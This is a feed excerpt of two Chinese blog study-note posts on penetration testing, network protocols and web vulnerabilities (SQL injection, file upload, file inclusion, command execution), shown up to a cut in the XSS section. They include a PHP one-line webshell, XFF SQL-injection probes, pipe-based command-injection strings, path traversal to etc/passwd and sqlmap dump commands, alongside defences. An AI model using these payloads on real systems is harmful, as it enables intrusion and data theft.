    <id>https://www.maonie.top/2024/05/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3/</id>
    <published>2024-05-06T07:47:16.000Z</published>
    <updated>2024-05-08T03:49:14.508Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>目前确定的说法之渗透测试的<strong>生命周期</strong></p><blockquote><p>渗透测试项目的生命周期可分为如下7个阶段：需求分析、信息收集、威胁建模、漏洞分析、漏洞利用、后渗透测试、撰写报告。<br>以下是PETS渗透测试项目生命周期的主要阶段：<br>1.前期交互阶段：<br>•与客户组织进行深入讨论，明确渗透测试的范围和目标。<br>•确保客户组织了解并同意测试所涉及的内容，从而确保测试的顺利进行。<br>2.情报搜集阶段：<br>•使用各种方法和技术来收集目标系统的信息，包括操作系统、开放的端口、网络架构等。<br>•通过社交媒体网络、Google Hacking技术、目标系统踩点等方式获取目标系统的详细信息。<br>3.威胁建模阶段：<br>•利用情报搜集阶段获取的信息，分析目标系统上可能存在的安全漏洞和弱点。<br>•识别潜在的安全风险，并为后续的渗透攻击阶段制定策略。<br>4.漏洞分析阶段：<br>•综合前面阶段获取的信息，分析哪些攻击途径是可行的。<br>•评估漏洞的严重程度和潜在影响，为攻击阶段提供决策依据。<br>5.渗透攻击阶段：<br>•根据前面的分析结果，对目标系统实施渗透攻击。<br>•尝试利用已发现的漏洞，获取目标系统的权限或访问敏感数据。<br>6.后渗透攻击阶段：<br>•在成功渗透后，进一步探索目标系统，获取更多的信息和权限。<br>•评估客户组织可能面临的最大业务风险，并提供相应的安全建议。<br>7.报告阶段：<br>•编写详细的渗透测试报告，记录测试过程和发现的问题。<br>•从防御者的角度提出针对性的安全建议和改进措施，帮助客户组织加强安全防护。<br>请注意，每个阶段都至关重要，需要精心设计和执行。同时，与客户保持良好的沟通和合作也是确保测试成功的关键。在整个生命周期中，测试人员需要遵循安全准则和最佳实践，确保测试的合法性和道德性。</p></blockquote><p>熟记即可<br><strong>简述题</strong> 列举常用渗透测试工具。</p><blockquote><p>信息收集类工具有nmap、fping、dnsmap等<br>漏洞分析类工具有sqlmap、nessus、awvs等<br>漏洞利用类工具有metasploit、burpsuite等<br>密码破解类工具有hydra、john、hashcat等<br>数据分析类工具有wireshark等。</p></blockquote><p>简述扫描技术的分类<br>扫描技术按照不同划分标准有不同的分类方式。如按照扫描技术分类可分为TCP扫描、UDP扫描，ICMP扫描、ARP扫描。其中TCP扫描又分为TCP CONNECT()扫描、TCP SYN扫描（这种方法较为常见）。ARP扫描效率较高，但不能跨网段，且工作在数据链路层，主要用于探测本地局域网中的主机存活情况。按照扫描所使用协议的工作层次，可分为二层扫描（ARP）、三层扫描（ICMP、IP）和四层扫描技术（TCP、UDP）。</p><span id="more"></span><p>然后是渗透测试要用到的工具相关</p><h1 id="一、nmap"><a href="#一、nmap" class="headerlink" title="一、nmap"></a>一、nmap</h1><p>nmap的主要功能包括目标主机存活性扫描(-sn)、端口扫描（-sS或-p80,443）、操作系统信息探测(-O)、漏洞信息探测(–script==default)。</p><p>nmap如下选项具体用途（-sn，-p-，-sV，-O，-sT，-sS，-sU）</p><pre class="line-numbers language-none"><code class="language-none">-sn 主机存活性扫描，类似于-sP;-p- 全端口扫描，类似于-p1-65535-sV 服务及版本扫描-O 操作系统类型探测-sT 全连接扫描（与目标建立完整三次握手）-sS 半连接扫描-sU UDP方式扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>简述nmap探测主机存活的技术有哪些？</strong></p><p><strong>Q:</strong> 按照扫描技术分类，Nmap的扫描可以分为TCP扫描、UDP扫描、ICMP扫描和ARP扫描等。</p><ol><li><strong>TCP</strong> <strong>扫描</strong>：TCP扫描是最常用的扫描类型之一，主要用于探测目标主机上开放的TCP端口和提供的TCP服务。TCP扫描又可以分为TCP connect()扫描和TCP SYN扫描等方法。<br>o  <strong>TCP connect()</strong> <strong>扫描</strong>：这是最基本的TCP扫描方式，通过尝试与目标主机的每个TCP端口建立完整的三次握手连接来判断端口是否开放。<br>o  <strong>TCP SYN</strong> <strong>扫描</strong>：SYN扫描是Nmap的默认扫描方式。它向目标主机的端口发送一个SYN数据包，并等待SYN/ACK响应。如果收到响应，则认为该端口是开放的。SYN扫描的优点是速度快且不易被检测到，因为它不会完成整个三次握手。</li><li><strong>UDP</strong> <strong>扫描</strong>：UDP扫描用于探测目标主机上开放的UDP端口。由于UDP是无连接的协议，因此UDP扫描通常比TCP扫描更困难。</li><li><strong>ICMP</strong> <strong>扫描</strong>：ICMP扫描主要利用ICMP协议来探测目标主机的网络连通性和可达性。</li><li><strong>ARP</strong> <strong>扫描</strong>：ARP扫描是一种在本地局域网中非常有效的主机发现方法。它通过发送ARP请求来探测目标主机是否存活。ARP扫描的效率很高，但不能跨网段，且只能扫描主机存活情况，不能探测端口开放情况。<br>其次，按照扫描所使用的协议工作层次，Nmap的扫描可以分为二层扫描（ARP）、三层扫描（ICMP、IP）和四层扫描技术（TCP、UDP）。</li></ol><p>·     <strong>二层扫描（ARP）</strong>：在数据链路层进行扫描，主要用于探测本地局域网中的主机存活情况。<br>·     <strong>三层扫描（ICMP、IP）</strong>：在网络层进行扫描，主要用于探测目标主机的网络连通性和可达性。<br>·     <strong>四层扫描（TCP、UDP）</strong>：在传输层进行扫描，主要用于探测目标主机上开放的TCP和UDP端口以及提供的服务。<br>总的来说，Nmap的扫描技术非常丰富和灵活，可以根据不同的需求和目的选择不同的扫描类型选项，以获取更全面和详细的扫描结果。</p><h1 id="二、sqlmap"><a href="#二、sqlmap" class="headerlink" title="二、sqlmap"></a>二、sqlmap</h1><h2 id="总之介绍一下各种参数吧"><a href="#总之介绍一下各种参数吧" class="headerlink" title="总之介绍一下各种参数吧"></a>总之介绍一下各种参数吧</h2><p>一般起始是python sqlmap.py</p><p>-u 决定目标url<br><code>sqlmap -u '目标地址'</code><br>–cookie 设置cookie 绕过安全检查<br><code>sqlmap -u '目标地址' --cookie 'cookie值'</code><br>–dbs 列出所有数据库<br><code>sqlmap -u '目标地址' --dbs</code><br>-D 指定数据库 –tables 爆出所有表<br><code>sqlmap -u '目标地址' -D '库名' --tables</code><br>-T 指定表 –dump 爆出所有数据<br><code>sqlmap -u '目标地址' -D '库名' -T '表名' --dump</code><br>–current-user 显示当前用户<br><code>sqlmap -u '目标地址' --current-user</code><br>–is-dba 检测是否为数据库管理员<br><code>sqlmap -u '目标地址' --is-dba</code><br>–users 获取所有用户<br><code>sqlmap -u '目标地址' --users</code></p><h2 id="然后是手动注入"><a href="#然后是手动注入" class="headerlink" title="然后是手动注入"></a>然后是手动注入</h2><p>这块我不太懂先略过</p><h1 id="三、BURPSUITE"><a href="#三、BURPSUITE" class="headerlink" title="三、BURPSUITE"></a>三、BURPSUITE</h1><p>主要是针对web应用程序的攻击 一款集成化的渗透测试工具<br>主要功能是抓包 改包 自带一个暴力破解模块 有四种attack type(攻击类型)</p><ul><li>Sinper（狙击手）</li><li>Battering ram（攻城槌）</li><li>Pitchfork（干草叉）</li><li>Cluster bomb（集束炸弹）</li></ul><h1 id="四、Ettercap"><a href="#四、Ettercap" class="headerlink" title="四、Ettercap"></a>四、Ettercap</h1><p>主要用于伪造或篡改数据包以实现SRP DNS协议的中间人攻击<br>没了</p><h1 id="五、metasploit"><a href="#五、metasploit" class="headerlink" title="五、metasploit"></a>五、metasploit</h1><p>Metasploit框架的核心组成部分包括exploit（漏洞利用模块）、payload（负载模块）、auxiliary（辅助模块）和post（后渗透模块）<br>exploit模块负责利用目标系统的漏洞<br>payload模块则负责在成功利用漏洞后执行特定任务<br>auxiliary模块提供非攻击性质的功能 如扫描、枚举和信息收集<br>post模块则用于在取得目标系统权限后进行进一步的信息收集和权限维持</p></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;目前确定的说法之渗透测试的&lt;strong&gt;生命周期&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;渗透测试项目的生命周期可分为如下7个阶段：需求分析、信息收集、威胁建模、漏洞分析、漏洞利用、后渗透测试、撰写报告。&lt;br&gt;以下是PETS渗透测试项目生命周期的主要阶段：&lt;br&gt;1.	前期交互阶段：&lt;br&gt;•	与客户组织进行深入讨论，明确渗透测试的范围和目标。&lt;br&gt;•	确保客户组织了解并同意测试所涉及的内容，从而确保测试的顺利进行。&lt;br&gt;2.	情报搜集阶段：&lt;br&gt;•	使用各种方法和技术来收集目标系统的信息，包括操作系统、开放的端口、网络架构等。&lt;br&gt;•	通过社交媒体网络、Google Hacking技术、目标系统踩点等方式获取目标系统的详细信息。&lt;br&gt;3.	威胁建模阶段：&lt;br&gt;•	利用情报搜集阶段获取的信息，分析目标系统上可能存在的安全漏洞和弱点。&lt;br&gt;•	识别潜在的安全风险，并为后续的渗透攻击阶段制定策略。&lt;br&gt;4.	漏洞分析阶段：&lt;br&gt;•	综合前面阶段获取的信息，分析哪些攻击途径是可行的。&lt;br&gt;•	评估漏洞的严重程度和潜在影响，为攻击阶段提供决策依据。&lt;br&gt;5.	渗透攻击阶段：&lt;br&gt;•	根据前面的分析结果，对目标系统实施渗透攻击。&lt;br&gt;•	尝试利用已发现的漏洞，获取目标系统的权限或访问敏感数据。&lt;br&gt;6.	后渗透攻击阶段：&lt;br&gt;•	在成功渗透后，进一步探索目标系统，获取更多的信息和权限。&lt;br&gt;•	评估客户组织可能面临的最大业务风险，并提供相应的安全建议。&lt;br&gt;7.	报告阶段：&lt;br&gt;•	编写详细的渗透测试报告，记录测试过程和发现的问题。&lt;br&gt;•	从防御者的角度提出针对性的安全建议和改进措施，帮助客户组织加强安全防护。&lt;br&gt;请注意，每个阶段都至关重要，需要精心设计和执行。同时，与客户保持良好的沟通和合作也是确保测试成功的关键。在整个生命周期中，测试人员需要遵循安全准则和最佳实践，确保测试的合法性和道德性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;熟记即可&lt;br&gt;&lt;strong&gt;简述题&lt;/strong&gt; 列举常用渗透测试工具。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;信息收集类工具有nmap、fping、dnsmap等&lt;br&gt;漏洞分析类工具有sqlmap、nessus、awvs等&lt;br&gt;漏洞利用类工具有metasploit、burpsuite等&lt;br&gt;密码破解类工具有hydra、john、hashcat等&lt;br&gt;数据分析类工具有wireshark等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;简述扫描技术的分类&lt;br&gt;扫描技术按照不同划分标准有不同的分类方式。如按照扫描技术分类可分为TCP扫描、UDP扫描，ICMP扫描、ARP扫描。其中TCP扫描又分为TCP CONNECT()扫描、TCP SYN扫描（这种方法较为常见）。ARP扫描效率较高，但不能跨网段，且工作在数据链路层，主要用于探测本地局域网中的主机存活情况。按照扫描所使用协议的工作层次，可分为二层扫描（ARP）、三层扫描（ICMP、IP）和四层扫描技术（TCP、UDP）。&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>协议/漏洞/网络</title>
    <link href="https://www.maonie.top/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/"/>
    <id>https://www.maonie.top/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/</id>
    <published>2024-05-05T02:10:55.000Z</published>
    <updated>2024-05-14T00:41:38.803Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>从头到尾再来一遍的感觉吧</p><span id="more"></span><h1 id="一、协议相关"><a href="#一、协议相关" class="headerlink" title="一、协议相关"></a>一、协议相关</h1><blockquote><p>网络通信协议是根据网络上的节点进行通信的一组规则，每种设备都可以根据通信协议识别其他设备的信息。</p></blockquote><h2 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h2><p>要讲网络协议 我们得先从OSI七层模型说起 OSI将网络通信分为七个层次 每个层次负责特定的功能 并且每个层次都与特定的协议相关联<br>它们分别为物理层、数据链路层、网络层、传输层、会话层、表示层和应用层</p><ol><li><strong>物理层：把网络连接在一起的物理手段 负责传送0与1的电信号</strong></li><li><strong>数据链路层：决定0与1的解读 分组方式</strong> 相关协议:ARP协议</li><li><strong>网络层：引进一套新的地址——“网络地址” 使得我们能区分不同的计算机是否属于同一个子网络 建立主机到主机的通信</strong> 相关协议：IP、ICMP协议</li><li><strong>传输层：有了MAC地址和IP地址 我们还需要一个参数 表示这个数据包到底供哪个程序来使用 这个参数就叫’端口’ 实现端口到端口的通信</strong> 相关协议：TCP、UDP协议</li><li><strong>会话层：负责建立和断开通信连接，以及数据的分割等传输相关的管理 （例：何时建立连接？何时断开连接？该保持多久的连接？）</strong>相关协议：SSL、TLS协议</li><li><strong>表示层：设备固有的数据格式与网络标准数据格式之间的转换 （接受不同的信息，例如文字流、图像、声音等）</strong></li><li><strong>应用层：针对特定应用的协议 网络服务与最终用户的一个接口</strong> 相关协议：HTTP、FTP、DNS、DHCP等协议<br><img data-src="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/1.png" alt="1"></li></ol><h2 id="HTTP协议-端口号80-HTTPS协议-端口号443"><a href="#HTTP协议-端口号80-HTTPS协议-端口号443" class="headerlink" title="HTTP协议 端口号80 HTTPS协议 端口号443"></a>HTTP协议 端口号80 HTTPS协议 端口号443</h2><p><strong>Web交互的基本流程</strong><br>请求：客户端根据服务器地址把数据发送给服务器的过程叫请求。<br>响应：服务器将请求的处理结果发送给浏览器的过程叫响应。</p><p><strong>什么是HTTP？</strong><br>概念：超文本传输协议。</p><h3 id="HTTP有什么特点？"><a href="#HTTP有什么特点？" class="headerlink" title="HTTP有什么特点？"></a><strong>HTTP有什么特点？</strong></h3><ol><li><p><strong>简单和灵活</strong>：</p><ul><li>HTTP协议使用简单的请求-响应模型，通信过程直观明了。它支持各种数据格式和内容类型，使得可以在网络上传输各种类型的数据。</li></ul></li><li><p><strong>无连接和无状态</strong>：</p><ul><li>HTTP协议是无连接的，即每次请求都是独立的，服务器不会保持与客户端的连接状态。同时，HTTP是无状态的，服务器不会保存请求之间的状态信息，每个请求都是独立的，这使得HTTP协议具有简单性和可伸缩性，但同时需要通过其他机制（如Cookie、Session）来管理用户状态。</li></ul></li><li><p><strong>基于文本</strong>：</p><ul><li>HTTP协议的请求和响应都是基于文本的，使用ASCII字符进行通信，这使得HTTP消息可以被直接查看和调试。</li></ul></li><li><p><strong>支持客户端-服务器模式</strong>：</p><ul><li>HTTP协议基于客户端-服务器模式，客户端发送请求，服务器返回响应。这种模式灵活且符合互联网应用的需求。</li></ul></li><li><p><strong>支持缓存机制</strong>：</p><ul><li>HTTP协议支持缓存机制，可以通过缓存技术减少网络传输，提高性能和用户体验。</li></ul></li><li><p><strong>扩展性</strong>：</p><ul><li>HTTP协议具有良好的扩展性，支持通过标头（Header）字段传递各种自定义信息，可以实现更复杂的功能和应用。</li></ul></li></ol><h3 id="HTTP有什么作用？"><a href="#HTTP有什么作用？" class="headerlink" title="HTTP有什么作用？"></a><strong>HTTP有什么作用？</strong></h3><ol><li><p><strong>传输网页和超文本内容</strong>：</p><ul><li>HTTP协议最基本的作用是传输网页和超文本内容。通过HTTP，浏览器可以向服务器请求网页，服务器则返回包含HTML、CSS、JavaScript等内容的响应，完成页面的展示和渲染。</li></ul></li><li><p><strong>传输各种类型的数据</strong>：</p><ul><li>除了网页，HTTP还可以传输各种类型的数据，如图像、音频、视频、文件等。HTTP支持多种内容类型和数据格式，使得互联网上的资源能够以统一的方式进行访问和传输。</li></ul></li><li><p><strong>实现客户端和服务器之间的通信</strong>：</p><ul><li>HTTP作为客户端和服务器之间的通信协议，使得客户端能够向服务器发送请求并接收响应。这种通信模式支持了各种互联网应用的实现，如浏览器访问网页、移动应用与服务器通信等。</li></ul></li><li><p><strong>支持Web应用的交互</strong>：</p><ul><li>HTTP协议支持通过请求和响应实现Web应用的交互功能，如用户登录、数据提交、状态管理等。</li></ul></li></ol><p>在网络通信中，请求头（Request Header）和响应头（Response Header）是HTTP协议中的重要部分，用于在客户端和服务器之间传递关于请求或响应的元数据信息。下面是它们的作用和常见字段的含义：</p><h3 id="请求头（Request-Header）"><a href="#请求头（Request-Header）" class="headerlink" title="请求头（Request Header）"></a>请求头（Request Header）</h3><p>请求头包含了客户端向服务器发送的请求的附加信息，这些信息描述了请求本身的性质、格式、认证信息等。常见的请求头字段包括：</p><ol><li><p><strong>User-Agent</strong></p><ul><li>含义：标识了发起请求的用户代理（通常是浏览器或应用程序）的相关信息，如操作系统、浏览器类型和版本号等。</li></ul></li><li><p><strong>Host</strong></p><ul><li>含义：指定被请求资源的主机名和端口号。</li></ul></li><li><p><strong>Accept</strong></p><ul><li>含义：指定客户端可接受的内容类型，用于服务器返回合适的响应。</li></ul></li><li><p><strong>Content-Type</strong></p><ul><li>含义：指定请求体的MIME类型，告诉服务器请求中的内容格式是什么样的。</li></ul></li><li><p><strong>Authorization</strong></p><ul><li>含义：包含用于对请求进行身份验证的凭据，通常用于发送身份验证信息（如基本认证或令牌）。</li></ul></li></ol><h3 id="响应头（Response-Header）"><a href="#响应头（Response-Header）" class="headerlink" title="响应头（Response Header）"></a>响应头（Response Header）</h3><p>响应头包含了服务器对客户端请求的响应的元数据信息，用于描述响应的属性、类型、缓存设置等。常见的响应头字段包括：</p><ol><li><p><strong>Content-Type</strong></p><ul><li>含义：指定响应体的MIME类型，告诉客户端响应的内容格式是什么样的。</li></ul></li><li><p><strong>Content-Length</strong></p><ul><li>含义：指定响应体的长度，以字节为单位。</li></ul></li><li><p><strong>Cache-Control</strong></p><ul><li>含义：控制缓存的行为，例如是否缓存响应、缓存的有效期等。</li></ul></li><li><p><strong>Set-Cookie</strong></p><ul><li>含义：在响应中设置Cookie，将会在客户端保存，用于跟踪会话状态或其他状态信息。</li></ul></li><li><p><strong>Location</strong></p><ul><li>含义：用于重定向，指示客户端应该跳转到的新位置。</li></ul></li></ol><h3 id="其他常见字段"><a href="#其他常见字段" class="headerlink" title="其他常见字段"></a>其他常见字段</h3><p>除了上述字段外，还有许多其他常见的请求头和响应头字段，用于控制和描述HTTP请求和响应的各个方面。例如：</p><ul><li><strong>Date</strong>：指定消息创建的日期和时间。</li><li><strong>Server</strong>：指示服务器的软件信息。</li><li><strong>ETag</strong>：用于缓存验证，表示资源的标识符。</li><li><strong>Referer</strong>：指示请求的来源页面 URL。</li><li><strong>Connection</strong>：控制连接的选项，如保持长连接或关闭连接等。</li></ul><p>这些请求头和响应头字段的合理设置和使用，能够有效地控制HTTP请求和响应的行为，提高通信的效率和安全性。</p><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>ARP协议的核心作用是在局域网内解析IP地址到MAC地址的映射关系，帮助设备确定数据包的接收方，从而实现有效的网络通信。</p><h2 id="DNS协议-端口号53"><a href="#DNS协议-端口号53" class="headerlink" title="DNS协议 / 端口号53"></a>DNS协议 / 端口号53</h2><p><strong>域名解析协议（DNS，Domain Name System）的用途是将域名和 IP 地址相互映射</strong></p><h1 id="二、漏洞相关"><a href="#二、漏洞相关" class="headerlink" title="二、漏洞相关"></a>二、漏洞相关</h1><p>讲讲漏洞的 <strong>成因 攻击方式/类型 预防方式</strong> </p><h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h2><p><strong>产生原因</strong><br>本质上是程序员没有遵循代码与数据分离原则 使用户数据作为代码执行 </p><blockquote><p>当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p></blockquote><p><strong>攻击方式/类型</strong><br>类型有 字符型或者数字型</p><ol><li>get注入<br>在get传参时写入参数，将SQl语句闭合，后面加写入自己的SQL语句。</li><li>post注入<br>通过post传参，原理与get一样，重要的是判断我们所输入的信息是否与数据库产生交互，其次判断SQL语句是如何闭合的。</li><li>有些网站通过查询cookie判断用户是否登录，需要与数据库进行交互，我们可以修改cookie的值，查找我们所需要的东西。或者通过报错注入是网页返回报错信息。</li><li>Referer注入<br>Referer正确写法应该是Referrer,因为http规定时写错只能将错就错，有些网站会记录ip和访问路径，例如百度就是通过Referer来统计网站流量，我们将访问路径进行SQL注入，同样也可以得到想要的信息。</li><li>XFF注入<br>在用户登录注册模块在 HTTP 头信息添加 X-Forwarded-for: 9.9.9.9’ ，用户在注册的时候，如果存在安全隐 患，会出现错误页面或者报错。从而导致注册或者登录用户失败。<br>burpsuite 抓包，提交输入检测语句：</li></ol><pre class="line-numbers language-text" data-language="text"><code class="language-text">X-Forwarded-for: 127.0.0.1'and 1=1#X-Forwarded-for: 127.0.0.1'and 1=2#//两次提交返回不一样，存在 SQL 注入漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="6"><li>UA注入：输入点在User-Agent</li></ol><p><strong>sql语句相关</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show databases; //显示数据库列表SELECT * FROM users; //检索数据insert into; //向数据表中插入新记录update; //更新表中记录delete from; //用于从数据表中删除数据create table; //创建新的数据库sum() //计算某列的总和count() //计算指定列的行数avg() min() max() abs() //平均值 最小值 最大值 绝对值TRUNCATE //清空某个表的数据drop //直接把表删了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>如何预防</strong><br>为了防止 SQL 注入攻击，可以采取以下几种防御方式：</p><ol><li><strong>使用参数化查询（Prepared Statements）</strong>：<ul><li>使用参数化查询是最有效的防御 SQL 注入的方法之一。参数化查询使用占位符（如 <code>?</code>）代替直接将用户输入嵌入到 SQL 查询中，然后将参数与查询分离，确保用户输入不会被当作 SQL 代码执行。</li></ul></li><li><strong>输入验证与过滤</strong>：<ul><li>对于用户输入的数据，进行严格的输入验证和过滤，只接受预期的数据格式和范围。例如，对于数字输入，确保只包含数字字符；对于字符串输入，可以使用白名单过滤非法字符。</li><li>在应用程序的前端和后端都进行输入验证，防止恶意输入进入系统。</li></ul></li><li><strong>最小权限原则（Least Privilege Principle）</strong>：<ul><li>遵循最小权限原则，为数据库用户分配最小必要的权限。应用程序连接数据库时，使用有限权限的数据库账号，避免使用具有过高权限的账号。</li></ul></li><li><strong>避免拼接 SQL 语句</strong>：<ul><li>避免将用户输入直接拼接到 SQL 查询语句中。即使对于动态构建的查询，也应该使用参数化查询或者安全的 ORM（对象关系映射）工具，而不是手动拼接字符串。</li></ul></li><li><strong>ORM 框架的使用</strong>：<ul><li>使用 ORM 框架（如Hibernate、Entity Framework等）可以帮助自动化地处理数据库访问和数据映射，减少手动编写 SQL 查询的机会，从而降低 SQL 注入的风险。</li></ul></li><li><strong>安全编码实践</strong>：<ul><li>培训开发人员和测试人员，提高他们对安全编码的认识，编写安全的代码和进行安全审计。</li><li>定期更新和维护应用程序和数据库系统，及时修复已知的安全漏洞。</li></ul></li><li><strong>监控与日志记录</strong>：<ul><li>实施安全监控和日志记录机制，及时发现和响应潜在的 SQL 注入攻击行为。</li></ul></li><li><strong>安全审计</strong>：<ul><li>定期进行安全审计和漏洞扫描，及时发现并修复存在的安全问题。</li></ul></li></ol><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p><strong>漏洞成因</strong></p><blockquote><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p></blockquote><p><strong>攻击方式/类型</strong><br>主要在于一句话木马的组成方式</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php eval($_POST['cmd']);?&gt;↑这就是最简单的一句话木马其中的$_POST可以替换为$_GET或者$_REQUEST分别代表POST传参 GET传参 两者皆可eval是命令执行函数其余的分别有：eval()：将字符串作为 PHP 代码执行。system()：执行系统命令并返回输出。exec()：执行外部命令。shell_exec()：执行 shell 命令并返回输出。passthru()：执行外部命令并将原始输出发送到输出。popen()：打开进程文件指针。proc_open()：执行命令并打开进程文件指针。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>随后把包含该内容的php文件上传至服务器 利用中国菜刀 蚁剑等软件连接即可</p><p><strong>防御方式</strong><br>检查文件类型 检查文件大小 传文件后更改文件名称 对文件内容进行检查与过滤</p><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p><strong>漏洞成因</strong><br>和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。</p><p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。</p><p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p><p>以PHP为例,常用的文件包含函数有以下四种<br>include(),require(),include_once(),require_once()</p><p>区别如下:</p><p><strong>require():找不到被包含的文件会产生致命错误，并停止脚本运行</strong><br><strong>include():找不到被包含的文件只会产生警告，脚本继续执行</strong><br><strong>require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</strong><br><strong>include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</strong></p><p><strong>攻击方式/类型</strong><br>分为 <strong>本地文件包含漏洞</strong> 与 <strong>远程文件包含漏洞</strong><br><strong>本地文件包含</strong>的话 可以利用绝对路径来获取账号信息 又或者读取服务器文件<br>在传参中加入若干个../与etc/passwd来看账号信息</p><p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则<strong>include/require</strong>函数是可以加载远程文件的，这种漏洞被称为<strong>远程文件包含</strong><br>这样的话可以下载远程网站的脚本 联合csrf攻击 或者执行远程代码</p><p><strong>如何防御</strong><br>本地：<strong>输入验证和过滤</strong> 限制用户访问范围 使用白名单机制限制允许包含的文件或目录列表 只允许应用程序包含受信任的文件<br>远程：关闭<code>allow_url_include</code>、<code>allow_url_fopen</code>等配置</p><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p><strong>漏洞成因</strong></p><blockquote><p>命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一<br>如PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致，可以执行命令的函数有system( )、exec( )、shell_exec( )、passthru( )、pcntl_execl( )、popen( )、proc_open( )等，当攻击者可以控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击<br>PHP执行命令是继承WebServer用户的权限，这个用户一般都有权限向Web目录写文件，可见该漏洞的危害性相当大</p></blockquote><p>假使有一个ping ip的网站 而输入框没有屏蔽; || | &amp;&amp; &amp;等管道符 导致了恶意代码的运行 这就是命令执行漏洞</p><p><strong>攻击方式/类型</strong></p><pre class="line-numbers language-none"><code class="language-none">管道符的区别WINDOWS系统支持的管道符“|”：直接执行后面的语句例如：ping www.baidu.com|whoami“||”：如果前面执行的语句执行出错，则执行后面的语句例如：ping www.baidu.com||whoami“&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假例如：ping www.baidu.com&amp;whoami或者ping www.baidu.com&amp;whoami“&amp;&amp;”：如果前面的语句为真先执行第一个命令后执行第二个命令；为假则直接出错，也不执行后面的语句例如：ping www.baidu.com&amp;&amp;whoamLINUX系统支持的管道符“；”执行完前面的命令执行后面的“|”：显示后面语句的执行结果“||”：当前面的语句执行出错时，执行后面的语句“&amp;”：如果前面的语句为假，则直接指向后面的语句，前面的语句可真可假“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般与linux命令 <strong>find</strong> 一同执行<br>find 目录(一般为/ 根目录) -name(限制条件为名称) ‘flag.txt’<br><strong>如何防御</strong><br>过滤管道符 使用白名单机制对输入内容进行限制</p><h2 id="XSS-CSRF漏洞"><a href="#XSS-CSRF漏洞" class="headerlink" title="XSS&amp;CSRF漏洞"></a>XSS&amp;CSRF漏洞</h2><p><strong>漏洞成因</strong><br>XSS：未对输入框中的内容进行严格过滤 